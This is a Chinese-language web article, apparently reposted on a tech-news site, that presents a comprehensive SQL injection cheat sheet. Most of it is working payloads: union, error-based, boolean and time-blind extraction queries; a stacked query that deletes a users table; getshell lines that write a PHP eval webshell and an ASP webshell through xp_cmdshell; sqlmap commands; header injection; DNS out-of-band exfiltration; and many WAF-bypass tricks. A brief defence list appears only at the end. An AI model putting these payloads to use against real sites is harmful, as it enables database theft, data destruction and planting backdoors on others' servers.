<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>这可能是最全的SQL注入总结，很有用 | 极客快訊</title><meta property="og:title" content="这可能是最全的SQL注入总结，很有用 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/5ecee08979374b6abe43d0c2f441eff5"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/00c2342.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/00c2342.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/00c2342.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="这可能是最全的SQL注入总结，很有用"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/00c2342.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>这可能是最全的SQL注入总结，很有用</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><h1 class=pgc-h-arrow-right>SQL注入原理</h1><p>当客户端提交的数据未作处理或转义直接带入数据库，就造成了sql注入。</p><p>攻击者通过构造不同的sql语句来实现对数据库的任意操作。</p><h1 class=pgc-h-arrow-right>SQL注入的分类</h1><p>按变量类型分：数字型和字符型</p><p>按HTTP提交方式分：POST注入、GET注入和Cookie注入</p><p>按注入方式分：布尔注入、联合注入、多语句注入、报错注入、延时注入、内联注入</p><p>按数据库类型分：</p><p>sql：oracle、mysql、mssql、access、sqlite、postgersqlnosql：mongodb、redis</p><h1 class=pgc-h-arrow-right>MySQL与MSSQL及ACCESS之间的区别</h1><p>1.MySQL5.0以下没有information_schema这个默认数据库</p><p>2.ACCESS没有库名，只有表和字段，并且注入时，后面必须跟表名，ACCESS没有注释</p><p class=pgc-end-literature>举例：select 1,2,3 from `table_name` union select 1,2,3 from `table_name`</p><p>3.MySQL使用limit排序，ACCESS使用TOP排序（TOP在MSSQL也可使用）</p><h1 class=pgc-h-arrow-right>判断三种数据库的语句</h1><ul><li>MySQL：and length(user())>10</li><li>ACCESS：and (select count(*)from MSysAccessObjects)>0</li><li>MSSQL：and (select count(*)from sysobjects)>0</li></ul><h1 class=pgc-h-arrow-right>基本手工注入流程</h1><p><strong>1.判断注入点</strong></p><ul><li>数字型：id=2-1</li><li>字符型：' 、')、 '))、 "、 ")、 "))</li><li>注释符：-- （这是--空格）、--+、/**/、#</li></ul><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/5ecee08979374b6abe43d0c2f441eff5><p class=pgc-img-caption></p></div><p><strong>2.获取字段数</strong></p><p>order by 二分法联合查询字段数，观察页面变化从而确定字段数</p><ul><li>order by 1</li><li>order by 50</li></ul><p>group by 译为分组，注入时也可使用，不过我没用过</p><p><strong>3.查看显示位尝试使用联合注入</strong></p><p>利用and 1=2或and 0及id=-12查看显示数据的位置</p><p>替换显示位改成SQL语句，查看信息（当前数据库，版本及用户名）</p><pre>and 1=2 union select version(),2,3</pre><p>再查询所有数据库</p><pre>and 1=2 union select (select group_concat(schema_name)from information schema.schemata),2,3</pre><p>查询所有表名</p><pre>union select (select group_concat(table_name)from information_schema.tables),2,3</pre><p>查询所有字段名</p><pre>union select (select group_concat(column_name)from information_schema.columns),2,3</pre><p>查询字段内容</p><p>如：查询test库下users表的id及uname字段，用'~'区分id和uname以防字符连接到一起</p><pre>union select(select group_concat(id,'~',uname)from test.users),2,3</pre><h1 class=pgc-h-arrow-right>报错注入</h1><p>通用报错语句：（测试版本MySQL8.0.12，MySQL5.0，mariadb5.5版本下）</p><pre>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</pre><p>POST中的报错注入</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a148a42516fa4226900e1dd7d9dd610c><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>布尔盲注</h1><p>我在盲注中常用的函数：</p><p>1.char() 解ASCII码;</p><p>2.mid()截取字符串;</p><p class=pgc-end-literature>举例：mid('hello',1,3)，从第1位开始截取3位，输出位hel</p><p>3.substr()与mid()相同，都为截取字符串;</p><p>4.count()计算查询结果的行数;</p><p>5.concat()查询结果合并但保持原有行数;</p><p>6.group_concat()查询结果合并但都放在一行中;</p><p>7.ascii() 查询ascii码;</p><p>猜数据库长度(利用二分法);</p><ul><li>id=1 and (length(database()))>1</li><li>id=1 and (length(database()))>50</li></ul><p>猜第一个字符，第二个字符，以此类推</p><ul><li>and ascii(mid(database(),1,1))>1</li><li>and ascii(mid(database(),2,1))>1</li></ul><p>查询当前数据库中所有表名;</p><pre>and (select count(table_name)from information_schema.tables where tables_schema=database())&gt;1and (select count(table_name)from information_schema.tables where tables_schema=database())&gt;10</pre><p>查询第一个表的长度;</p><pre>and (select length(table_name)from information_schema.tables where tables_schema=database()limit 0,1)&gt;10</pre><p>查询表的第一个字符;</p><pre>and ascii(mid((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))&gt;1</pre><p>查询atelier表里有几个字段;</p><pre>and(select count(column_name)from information_schema.columns where table_name = 'atelier' and table_schema = database())&gt;2</pre><p>查询第一个字段长度;</p><pre>and length((select column_name from information_schema.columns where table_name='atelier' and table_schema= database()limit 0,1))&gt;1</pre><p>查询字段第一个字符;</p><pre>and ascii(mid((select column_name from information_schema.columns where table_schema = 'db83231_asfaa' and TABLE_NAME ='atelier' limit 0,1),1,1))&gt;105</pre><p>查询字段所有行数;</p><pre>and (select count(*) from db83231_asfaa.atelier)&gt;4</pre><p>查询字段名的行数（查询emails表，uname字段）;</p><pre>and (select count(uname)from security.emails)&gt;7 查询uname的行数</pre><p>查询字段内容;</p><pre>length((select username from security.users limit 0,1))&gt;10ascii(mid((select username from security.user limit 0,1),1,1))&gt;100</pre><p>将查询到的ASCII码放到mysql中查询。</p><p class=pgc-end-literature>举例：select char(39);</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/2aedd0e74cf14da19abf7db3019248b7><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>延时盲注</h1><p>利用sleep(3)和if(1=2,1,0)及case进行延时注入，示例：</p><pre>select * from user where id='1' or sleep(3) %23</pre><p>这个没什么好说的</p><pre>select * from user where id= 1 and if(length(version())&gt;10,sleep(3),0);</pre><p>如果长度大于10，则睡3秒，其他则0秒</p><pre>select * from user where id= 1 and case length(version())&gt;10 when 1 then sleep(3) else 0 end;</pre><p>case定义条件，when 后面的1表示ture也代表真，当条件为真时，睡3秒，其他则0秒。</p><h1 class=pgc-h-arrow-right>多语句注入</h1><p>多语句意思就是可以执行多个语句，利用分号进行隔开</p><pre>示例：id=1";WAITFOR DELAY '0:0:3';delete from users; --+id=1';select if(length(user(),1,1)&gt;1,sleep(3),1) %23';select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;1,sleep(3),1) %23</pre><h1 class=pgc-h-arrow-right>内联注入</h1><pre>举例：id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</pre><p>利用别名：</p><pre>union select 1,2,3,4,a.id,b.id,* from(sys_admin as a inner join sys_admin as b on a.id=b.id)</pre><h1 class=pgc-h-arrow-right>getshell</h1><pre>id=-1' union select 1,2,(select '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/html/404.php') --+</pre><p>也可使用dumpfile进行写入。</p><p><strong>outfile和dumpfile的区别：</strong></p><p>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。dumpfile只能执行一行数据。</p><p>数据库写入：</p><pre>exec master..xp_cmdshell 'echo "&lt;%eXECutegLobaL rEquEst(0)%&gt;" &gt; "c:\www\upload\Files\2019-11\404.asp"'</pre><h1 class=pgc-h-arrow-right>宽字节注入</h1><p>当编码位gbk时，%df%27或%81%27数据为空</p><p>就是说客户端发送的数据编码为gbk时，那么可能会吃掉转义字符\反斜杠，闭合之后页面恢复正常，存在宽字节注入</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f2e4069975654d02ab56173d40ec4d57><p class=pgc-img-caption></p></div><p>测试出来就可以使用sqlmap跑了，23333</p><p>加*构造注入点（比-p更稳定），让sqlmap对构造注入点进行注入攻击（*优先级更高）</p><p>宽字节防御：</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/02b82817d9874c6facadb0abd88a0d0e><p class=pgc-img-caption></p></div><p>第10行代码必须和第24行必须同时使用，要么就更换编码格式</p><h1 class=pgc-h-arrow-right>二次编码注入</h1><p>代码中有urldecode() 函数</p><p>%2527 先解码成%27再解码成'单引号</p><pre>sqlmap -u http://192.168.100.141/index.php/author=123 --prefix "%2527" --suffix "%23"</pre><p>-prefix为设置前缀 -suffix为设置后缀</p><p>设置后缀，防止sqlmap使用内联注</p><p>使用自带的脚本进行注入chardoubleencode.py</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/73d6d1dfe51f439e87195a073ff7df98><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>图片上传sql注入</h1><p>猜结构，为时间戳加文件名</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/6fbf7c50198940f79a98048015be736e><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/2ee5fb35b3f74b3a99a5d67fbdd4a2a8><p class=pgc-img-caption></p></div><p>替换and sleep(3) 为*进行salmap</p><h1 class=pgc-h-arrow-right>二次注入</h1><p>abc' 数据经过addslashes过滤，单引号前面添加反斜杠abc\'，但传到数据库的数据还是abc'</p><p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test'，接下来访问xxx.php?username=test'，页面返回id=22；</p><p>接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p><p>访问xxx.php?id=test' union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。</p><h1 class=pgc-h-arrow-right>XFF头注入</h1><pre>update user set loat_loginip = '8.8.8.8' where id =1 and sleep(5) #' where username = 'zs';</pre><p>id根据网站用户量取一个中间值，测试是否有注入，利用插件设置XFF头，如果网站不报错，可尝试此注入；</p><pre>X-Forward-For：127.0.0.1' select 1,2,user()</pre><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/75b96c8165db425f84c5eab1dbce1572><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>User-Agent请求头注入</h1><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/4693e7e7a8344831bce78da551122ea1><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>DNS外带日志示例</h1><p>外带平台 ：xip.io ceye.io</p><p>MSSQL查询当前数据库；</p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/e3dcbbc64f1547f9a72a3fb9030a7935><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d3a6f29d7b374b1da9fd713306b60476><p class=pgc-img-caption></p></div><p><strong>MySQL查询数据库版本；</strong></p><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/31fe3b12d61a4ab6a5c948e82fde4d80><p class=pgc-img-caption></p></div><div class=pgc-img><img alt=这可能是最全的SQL注入总结，很有用 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/06eebf63ca5d42d69c3b7925d0340aea><p class=pgc-img-caption></p></div><h1 class=pgc-h-arrow-right>常用过WAF技巧</h1><p><strong>1.特征字符大小写（基本没用）</strong></p><pre>UnIoN SeLcT 1,2,3</pre><p><strong>2.内联注释</strong></p><pre>id=-1/*!UNION*/%20//*!SELECT*/%201,2,3</pre><p><strong>3.特殊字符代替空格</strong></p><p>%09 tab键(水平)、%0a 换行、%0c 新的一页%0d return功能、%0b tab键(垂直)、%a0空格</p><p><strong>4.等价函数和逻辑符号</strong></p><pre>hex()、bin()==&gt;ascii()sleep()==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr()==&gt;substring()@@version==&gt;version()@@datadir==&gt;datadir()逻辑符号：如and和or不能使用时，尝试&amp;&amp;和||双管道符。</pre><p><strong>5.特殊符号</strong></p><p>反引号，select `version()`，绕过空格和正则加号和点，"+"和"."代表连接，也可绕过空格和关键字过滤@符号，用于定义变量，一个@代表用户变量，@@代表系统变量</p><p><strong>6.关键字拆分</strong></p><pre>'se'+'lec'+'t'%S%E%L%C%T 1,2,3?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell"net user"')!和()：'or--+2=--!!!'2id=1+(UnI)(oN)+(SeL)(EcT)</pre><p><strong>7.加括号绕过</strong></p><p>小括号</p><pre>union (select+1,2,3+from+users)%23union(select(1),(2),(3)from(users))id=(1)or(0x50=0x50)id=(-1)union(((((((select(1),hex(2),hex(3)from(users))))))))</pre><p>花括号</p><pre>select{x user}from{x mysql.user}id=-1 union select 1,{x 2},3</pre><p><strong>8.过滤and和or下的盲注</strong></p><pre>id=strcmp(left((select%20username%20from%20users%20limit%200,1),1),0x42)%23id=strcmp(left((select+username+from+limit+0,1),1,0x42)%23</pre><p><strong>9.白名单绕过</strong></p><p>拦截信息：</p><pre>GET /pen/news.php?id=1 union select user,password from mysql.user</pre><p>绕过：</p><pre>GET /pen/news. php/admin?id=1 union select user,password from mysql. userGET /pen/admin/..\news. php?id=1 union select user,password from mysql. user</pre><p><strong>10.HTTP参数控制</strong></p><p>（1）HPP（HTTP Parmeter Polution）（重复参数污染）</p><p class=pgc-end-literature>举例：</p><pre>index.php?id=1 union select username,password from usersindex.php?id=1/**/union/*&amp;id=*/select/*&amp;id=*/username.password/*&amp;id=*/from/*&amp;id=*/users</pre><p>HPP又称作重复参数污染，最简单的是?uid=1&uid=2&uid=3，对于这种情况，不用的web服务器处理方式不同。</p><p>具体WAF如何处理，要看设置的规则，不过示例中最后一个有较大可能绕过</p><p>（2）HPF（HTTP Parmeter Fragment）（HTTP分割注入）</p><p>HTTP分割注入，同CRLF有相似之处（使用控制字符%0a、%0d等执行换行）</p><p class=pgc-end-literature>举例：</p><pre>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</pre><h1 class=pgc-h-arrow-right>SQL注入防御</h1><p>1.对用户输入的内容进行转义；</p><p>2.限制关键字的输入，如单引号、双引号、右括号等，限制输入的长度；</p><p>3.使用SQL语句预处理，对SQL语句进行预编译，然后进行参数绑定，最后传入参数；</p><p>4.添加WAF，防火墙等。</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'SQL','总结','最全'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>